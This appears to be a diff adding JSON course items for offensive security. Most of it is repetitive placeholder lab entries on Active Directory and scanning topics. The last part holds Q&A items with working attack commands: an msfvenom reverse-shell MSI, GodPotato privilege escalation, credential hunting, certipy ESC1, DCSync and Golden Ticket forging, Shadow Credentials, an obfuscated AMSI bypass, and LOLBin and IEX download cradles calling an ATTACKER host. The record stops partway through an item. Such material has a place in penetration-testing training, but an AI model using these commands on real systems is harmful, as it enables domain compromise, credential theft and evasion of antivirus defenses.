+    "prompt": "Vulnerability Scanning with Nessus Lab 5 - You are tasked with applying Vulnerability Scanning with Nessus concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Vulnerability Scanning with Nessus.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 29,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Vulnerability Scanning with OpenVAS Lab 1 - You are tasked with applying Vulnerability Scanning with OpenVAS concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Vulnerability Scanning with OpenVAS.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 29,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Vulnerability Scanning with OpenVAS Lab 2 - You are tasked with applying Vulnerability Scanning with OpenVAS concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Vulnerability Scanning with OpenVAS.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 29,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Vulnerability Scanning with OpenVAS Lab 3 - You are tasked with applying Vulnerability Scanning with OpenVAS concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Vulnerability Scanning with OpenVAS.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 29,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Vulnerability Scanning with OpenVAS Lab 4 - You are tasked with applying Vulnerability Scanning with OpenVAS concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Vulnerability Scanning with OpenVAS.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 29,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Vulnerability Scanning with OpenVAS Lab 5 - You are tasked with applying Vulnerability Scanning with OpenVAS concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Vulnerability Scanning with OpenVAS.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 30,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Documentation & Reporting Lab 1 - You are tasked with applying Documentation & Reporting concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Documentation & Reporting.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 30,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Documentation & Reporting Lab 2 - You are tasked with applying Documentation & Reporting concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Documentation & Reporting.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 30,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Documentation & Reporting Lab 3 - You are tasked with applying Documentation & Reporting concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Documentation & Reporting.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 30,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Documentation & Reporting Lab 4 - You are tasked with applying Documentation & Reporting concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Documentation & Reporting.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 30,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Documentation & Reporting Lab 5 - You are tasked with applying Documentation & Reporting concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Documentation & Reporting.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 31,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Attacking Enterprise Networks Lab 1 - You are tasked with applying Attacking Enterprise Networks concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Attacking Enterprise Networks.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 31,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Attacking Enterprise Networks Lab 2 - You are tasked with applying Attacking Enterprise Networks concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Attacking Enterprise Networks.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 31,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Attacking Enterprise Networks Lab 3 - You are tasked with applying Attacking Enterprise Networks concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Attacking Enterprise Networks.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 31,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Attacking Enterprise Networks Lab 4 - You are tasked with applying Attacking Enterprise Networks concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Attacking Enterprise Networks.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 31,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Attacking Enterprise Networks Lab 5 - You are tasked with applying Attacking Enterprise Networks concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Attacking Enterprise Networks.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 32,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "LLMNR/NBT-NS Poisoning Lab 1 - You are tasked with applying LLMNR/NBT-NS Poisoning concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to LLMNR/NBT-NS Poisoning.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 32,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "LLMNR/NBT-NS Poisoning Lab 2 - You are tasked with applying LLMNR/NBT-NS Poisoning concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to LLMNR/NBT-NS Poisoning.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 32,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "LLMNR/NBT-NS Poisoning Lab 3 - You are tasked with applying LLMNR/NBT-NS Poisoning concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to LLMNR/NBT-NS Poisoning.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 32,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "LLMNR/NBT-NS Poisoning Lab 4 - You are tasked with applying LLMNR/NBT-NS Poisoning concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to LLMNR/NBT-NS Poisoning.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 32,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "LLMNR/NBT-NS Poisoning Lab 5 - You are tasked with applying LLMNR/NBT-NS Poisoning concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to LLMNR/NBT-NS Poisoning.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 33,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Pass the Ticket & Pass the Certificate Lab 1 - You are tasked with applying Pass the Ticket & Pass the Certificate concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Pass the Ticket & Pass the Certificate.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 33,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Pass the Ticket & Pass the Certificate Lab 2 - You are tasked with applying Pass the Ticket & Pass the Certificate concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Pass the Ticket & Pass the Certificate.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 33,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Pass the Ticket & Pass the Certificate Lab 3 - You are tasked with applying Pass the Ticket & Pass the Certificate concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Pass the Ticket & Pass the Certificate.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 33,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Pass the Ticket & Pass the Certificate Lab 4 - You are tasked with applying Pass the Ticket & Pass the Certificate concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Pass the Ticket & Pass the Certificate.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 33,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Pass the Ticket & Pass the Certificate Lab 5 - You are tasked with applying Pass the Ticket & Pass the Certificate concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Pass the Ticket & Pass the Certificate.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 34,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "ACL Abuse Lab 1 - You are tasked with applying ACL Abuse concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to ACL Abuse.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 34,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "ACL Abuse Lab 2 - You are tasked with applying ACL Abuse concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to ACL Abuse.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 34,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "ACL Abuse Lab 3 - You are tasked with applying ACL Abuse concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to ACL Abuse.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 34,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "ACL Abuse Lab 4 - You are tasked with applying ACL Abuse concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to ACL Abuse.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 34,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "ACL Abuse Lab 5 - You are tasked with applying ACL Abuse concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to ACL Abuse.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 35,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Domain Trust Attacks Lab 1 - You are tasked with applying Domain Trust Attacks concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Domain Trust Attacks.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 35,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Domain Trust Attacks Lab 2 - You are tasked with applying Domain Trust Attacks concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Domain Trust Attacks.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 35,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Domain Trust Attacks Lab 3 - You are tasked with applying Domain Trust Attacks concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Domain Trust Attacks.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 35,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Domain Trust Attacks Lab 4 - You are tasked with applying Domain Trust Attacks concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Domain Trust Attacks.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 35,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Domain Trust Attacks Lab 5 - You are tasked with applying Domain Trust Attacks concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Domain Trust Attacks.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 36,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Constrained & Unconstrained Delegation Lab 1 - You are tasked with applying Constrained & Unconstrained Delegation concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Constrained & Unconstrained Delegation.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 36,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Constrained & Unconstrained Delegation Lab 2 - You are tasked with applying Constrained & Unconstrained Delegation concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Constrained & Unconstrained Delegation.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 36,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Constrained & Unconstrained Delegation Lab 3 - You are tasked with applying Constrained & Unconstrained Delegation concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Constrained & Unconstrained Delegation.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 36,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Constrained & Unconstrained Delegation Lab 4 - You are tasked with applying Constrained & Unconstrained Delegation concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Constrained & Unconstrained Delegation.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 36,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "Constrained & Unconstrained Delegation Lab 5 - You are tasked with applying Constrained & Unconstrained Delegation concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to Constrained & Unconstrained Delegation.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 37,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "AD CS Attacks Lab 1 - You are tasked with applying AD CS Attacks concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to AD CS Attacks.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 37,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "AD CS Attacks Lab 2 - You are tasked with applying AD CS Attacks concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to AD CS Attacks.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 37,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "AD CS Attacks Lab 3 - You are tasked with applying AD CS Attacks concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to AD CS Attacks.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 37,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "AD CS Attacks Lab 4 - You are tasked with applying AD CS Attacks concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to AD CS Attacks.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 37,
+    "hints": [
+      "Review the cheatsheet for the exact commands.",
+      "Check for misconfigurations in the target service.",
+      "Ensure your syntax perfectly matches the required parameters."
+    ],
+    "prompt": "AD CS Attacks Lab 5 - You are tasked with applying AD CS Attacks concepts in a controlled environment.",
+    "solution": "1. Deploy the target machine.\n2. Perform enumeration related to AD CS Attacks.\n3. Execute the attack vector.\n4. Retrieve the flag.",
+    "difficulty": "Advanced"
+  },
+  {
+    "module_id": 38,
+    "prompt": "Describe the winPEAS enumeration process and how to interpret its output.",
+    "answer": "Run .\\winPEAS.exe > winpeas_output.txt. It colour-codes findings by severity: red/yellow indicate high-value vectors. Review System Information (OS/patch level), User Privileges (SeImpersonatePrivilege), Service Vulnerabilities (unquoted paths, weak permissions), AlwaysInstallElevated, Credentials, and Registry autoruns. Red = likely exploitable. Address red findings first before moving to yellow.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 38,
+    "prompt": "Explain the Potato attack chain for SeImpersonatePrivilege abuse.",
+    "answer": "SeImpersonatePrivilege is held by service accounts. Potato attacks (JuicyPotato, PrintSpoofer, GodPotato) abuse Windows COM server token impersonation. (1) The malicious process triggers an impersonation request. (2) Impersonates the SYSTEM token on the incoming connection. (3) Creates a child process (cmd.exe) inheriting the SYSTEM token. GodPotato works on Win10/Win11/Server 2022. Run: .\\GodPotato-NET4.exe -cmd 'cmd /c whoami' -> nt authority\\system.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 38,
+    "prompt": "How do you exploit an unquoted service path vulnerability?",
+    "answer": "(1) Find with wmic: wmic service get name,pathname | findstr /i 'auto' | findstr /i /v 'C:\\\\Windows'. (2) Confirm unquoted path e.g. C:\\Program Files\\Vulnerable App\\binary.exe. (3) Confirm write access: icacls 'C:\\Program Files\\Vulnerable'. (4) Place payload at C:\\Program.exe (or the earliest writable segment). (5) Restart the service: sc stop ServiceName; sc start ServiceName. Service starts as SYSTEM, executing payload.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 38,
+    "prompt": "Describe the AlwaysInstallElevated privilege escalation technique.",
+    "answer": "When both HKCU and HKLM registry keys AlwaysInstallElevated are set to 1, any user can install an MSI file with SYSTEM privileges. (1) Verify both keys are 1. (2) Generate MSI: msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f msi -o evil.msi. (3) Execute: msiexec /quiet /qn /i evil.msi. Shell returns as SYSTEM. Catch with nc -nlvp 4444.",
+    "difficulty": "beginner"
+  },
+  {
+    "module_id": 38,
+    "prompt": "What credential sources should you always check after gaining initial Windows access?",
+    "answer": "1. cmdkey /list — stored Windows credentials. 2. reg query HKLM /f password /t REG_SZ /s — registry passwords. 3. C:\\Windows\\Panther\\Unattend.xml — unattend deployment files. 4. %APPDATA% and %LOCALAPPDATA% — application configs. 5. C:\\inetpub\\wwwroot\\web.config — IIS configs with connection strings. 6. Get-ChildItem -Path C:\\ -Include *.config,*.ini,*.xml -Recurse | Select-String 'password'. 7. User's browser credentials (LaZagne.exe browsers).",
+    "difficulty": "beginner"
+  },
+  {
+    "module_id": 39,
+    "prompt": "What is a Golden Ticket and what does the krbtgt hash enable?",
+    "answer": "A Golden Ticket is a forged Kerberos TGT signed with the krbtgt account's NTLM hash. Since KDCs trust any TGT signed with krbtgt, the attacker can forged a ticket for any user (including non-existent ones) with any group memberships. A Golden Ticket is valid for up to 10 years (though KDCs check max lifetime). The krbtgt hash gives full persistent domain admin access until it is rotated TWICE (two resets are needed to invalidate all existing tickets).",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 39,
+    "prompt": "Explain ADCS ESC1 — what misconfiguration enables it and how to exploit it?",
+    "answer": "ESC1 (Misconfigured Certificate Templates): the template allows SAN (Subject Alternative Name) specification by the requestor AND allows Domain Authentication EKU AND is available to low-privilege users. Exploit: (1) certipy find -vulnerable to discover. (2) certipy req -u user@corp -p pass -target ca.corp -template VulnTemplate -upn administrator@corp.local -ca corp-CA. (3) Receive .pfx certificate for 'administrator'. (4) certipy auth -pfx administrator.pfx -dc-ip DC_IP -> returns NTLM hash.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 39,
+    "prompt": "How does a DCSync attack work and who can perform it by default?",
+    "answer": "DCSync simulates a Domain Controller replication request to obtain password hashes without touching LSASS on the DC. It uses the MS-DRSR protocol (GetNCChanges). By default: DCs themselves, DA group members, Domain Admins. To use: impacket-secretsdump domain/admin:pass@dc-ip -just-dc-ntlm (or Mimikatz: lsadump::dcsync /user:krbtgt). To persist: grant replication rights to a regular account: Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' -PrincipalIdentity luser -Rights DCSync.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 39,
+    "prompt": "Describe Shadow Credentials — what permissions does it require and how is it chained to full compromise?",
+    "answer": "Shadow Credentials abuses the msDS-KeyCredentialLink attribute on AD objects. An attacker with GenericWrite on a target object appends a crafted key credential. The target user then authenticates via PKINIT (certificate-based Kerberos) using the injected key. (1) Whisker.exe add /target:administrator — injects key credential and outputs base64 cert. (2) Rubeus.exe asktgt /user:administrator /certificate:BASE64 /password:pass /ptt — gets DA TGT. Works even with ACL as low-privilege user if GenericWrite is present. BloodHound shows GenericWrite edges.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 39,
+    "prompt": "Why should the krbtgt hash be stored off-target after DCSync, and how do you recover if locked out?",
+    "answer": "krbtgt hash enables Golden Ticket generation at any time in future, even if all other credentials are rotated. Store securely in password manager / encrypted notes off the target. If locked out: use krbtgt hash to forge Golden Ticket: impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain corp.local Administrator. Use ticket: export KRB5CCNAME=./Administrator.ccache; impacket-psexec -k -no-pass corp.local/Administrator@dc01.corp.local.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 40,
+    "prompt": "What is AMSI and how can it be bypassed in a PowerShell session?",
+    "answer": "AMSI (Antimalware Scan Interface) hooks PowerShell, .NET, and JScript runtimes to scan content for malware signatures before execution. Classic bypass: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true). This sets amsiInitFailed to true, disabling AMSI for the current session. Must be string-concatenated or obfuscated to avoid detection of the bypass string itself: 'amsiInit' + 'Failed'.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 40,
+    "prompt": "What are LOLBins and give three examples used for payload delivery?",
+    "answer": "LOLBins (Living Off the Land Binaries) are trusted Windows binaries with functionality that can be abused for malicious purposes. Three examples: 1. certutil.exe -urlcache -split -f http://ATTACKER/file.exe file.exe — downloads files bypassing some web filters. 2. mshta.exe http://ATTACKER/payload.hta — executes HTA (HTML Application) files, which can run VBScript/JScript. 3. regsvr32.exe /s /n /u /i:http://ATTACKER/payload.sct scrobj.dll — COM scriptlet execution, often allowed through firewall. These run as signed Microsoft binaries, bypassing application whitelisting.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 40,
+    "prompt": "Describe how to execute a PowerShell script in-memory to avoid AV detection.",
+    "answer": "In-memory execution avoids writing to disk. Method 1: IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1'). Method 2: IEX (iwr 'http://ATTACKER/script.ps1' -UseBasicParsing). Method 3 (avoids DownloadString detection): $data = (New-Object System.Net.WebClient).DownloadData('http://ATTACKER/script.ps1'); $text = [System.Text.Encoding]::UTF8.GetString($data); IEX $text. Apply AMSI bypass before any of these to prevent AMSI from scanning the downloaded content.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 40,
+    "prompt": "How do ETW (Event Tracing for Windows) patches differ from AMSI bypasses?",
